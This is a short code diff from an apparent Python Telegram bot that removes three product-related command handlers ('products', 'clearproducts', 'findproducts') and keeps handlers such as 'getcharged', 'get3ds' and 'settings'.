-    app.add_handler(CommandHandler("products", products_command))
-    app.add_handler(CommandHandler("clearproducts", clearproducts_command))
-    app.add_handler(CommandHandler("findproducts", findproducts_command))
     app.add_handler(CommandHandler("getcharged", getcharged_command))
     app.add_handler(CommandHandler("get3ds", get3ds_command))
     app.add_handler(CommandHandler("settings", settings_command))
